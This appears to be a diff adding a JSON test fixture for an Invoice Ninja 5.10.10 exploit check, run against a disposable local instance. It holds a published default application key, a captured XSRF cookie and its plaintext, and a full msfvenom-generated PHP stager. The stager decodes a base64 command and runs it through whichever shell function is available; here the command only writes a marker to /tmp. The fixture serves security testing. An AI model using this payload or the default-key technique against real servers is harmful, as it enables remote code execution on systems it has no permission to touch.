@@ -1,0 +1,26 @@
+{
+  "provenance": {
+    "source": "Official Invoice Ninja 5.10.10 disposable native fixture, real GET /login and observed owner AES plaintext",
+    "image": "invoiceninja/invoiceninja@sha256:1999d70953484cc49a3c9386ac8d8a6e8b2730c0302b9901ac14a074f7038fc9",
+    "captured_at": "2026-11-20T21:16:30Z",
+    "phase": "20261120T211529-2e934e/invoiceninja",
+    "php_payload": "Captured output of the local standard msfvenom CLI with php/exec and raw format, using the exact CMD recovered from the native observed payload. HTTP and PHP payload are doubled in the unit test; the POSIX shell is real and the PHP function only records argv.",
+    "app_key": "Published disposable .env.example default",
+    "php_generator_revision": "a68834368468d4621ef9dba1d921c074971ebbdf",
+    "php_generator_argv": [
+      "bundle",
+      "exec",
+      "ruby",
+      "msfvenom",
+      "-p",
+      "php/exec",
+      "CMD=printf %s Invoice\\ Ninja\\ PHP >> /tmp/module-target-invoiceninja-owner-45215-php-ascii-0",
+      "-f",
+      "raw"
+    ]
+  },
+  "app_key": "base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=",
+  "set_cookie": "XSRF-TOKEN=eyJpdiI6Imdaa3JzM0Q1R1lWTUtzdHVib1JNSnc9PSIsInZhbHVlIjoiT1lGMDN0cUwyTEt3UzJrTTZUU0RjZUh3STFtWFRhaTVRNzZpUWRGL0xUUWpPaUtTZU5ORFMxTi9Qd3dOWWgxOGY2MlVKbFI2c1ZkWmtjRDFpSFNndUwvcVA4ODB1ZnhJV014SFBld0R4NXZXOVMyWTF5WDJGeXhlYWl5enZiYVoiLCJtYWMiOiI0YzNmOTAwZjA5YmUyNGU4NGM1N2Q1YWU0ZmY1ZTc3NDhiNzUwNDJkZDAxNmMwMTgxNjAxY2VjMzgwMWYwYmM5IiwidGFnIjoiIn0%3D; expires=Fri, 20 Nov 2026 23:16:30 GMT; Max-Age=7200; path=/; domain=127.0.0.1; samesite=lax",
+  "xsrf_plaintext": "TnXSNSv2Can8DZHUgQmUEGmTSTOsa0DLghhqFlEm",
+  "php_program": "/*<?php /**/ @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0); $reHN=@ini_get('disable_functions'); if(!empty($reHN)){ $reHN=preg_replace('/[, ]+/',',',$reHN); $reHN=explode(',',$reHN); $reHN=array_map('trim',$reHN); }else{ $reHN=array(); } $jG9sMdgN_u=base64_decode('cHJpbnRmICVzIEludm9pY2VcIE5pbmphXCBQSFAgPj4gL3RtcC9tb2R1bGUtdGFyZ2V0LWludm9pY2VuaW5qYS1vd25lci00NTIxNS1waHAtYXNjaWktMA=='); if (FALSE!==stristr(PHP_OS,'win')){ $jG9sMdgN_u=$jG9sMdgN_u.\" 2>&1\\n\"; } $YKiLPgI2='is_callable'; $tVzx8='in_array'; if($YKiLPgI2('passthru')&&!$tVzx8('passthru',$reHN)){ ob_start(); passthru($jG9sMdgN_u); $yNIT=ob_get_contents(); ob_end_clean(); }else if($YKiLPgI2('proc_open')&&!$tVzx8('proc_open',$reHN)){ $handle=proc_open($jG9sMdgN_u,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes); $yNIT=NULL; while(!feof($pipes[1])){ $yNIT.=fread($pipes[1],1024); } @proc_close($handle); }else if($YKiLPgI2('popen')&&!$tVzx8('popen',$reHN)){ $fp=popen($jG9sMdgN_u,'r'); $yNIT=NULL; if(is_resource($fp)){ while(!feof($fp)){ $yNIT.=fread($fp,1024); } } @pclose($fp); }else if($YKiLPgI2('shell_exec')&&!$tVzx8('shell_exec',$reHN)){ $yNIT=`$jG9sMdgN_u`; }else if($YKiLPgI2('system')&&!$tVzx8('system',$reHN)){ ob_start(); system($jG9sMdgN_u); $yNIT=ob_get_contents(); ob_end_clean(); }else if($YKiLPgI2('exec')&&!$tVzx8('exec',$reHN)){ $yNIT=array(); exec($jG9sMdgN_u,$yNIT); $yNIT=join(chr(10),$yNIT).chr(10); }else { $yNIT=0; }"
+}
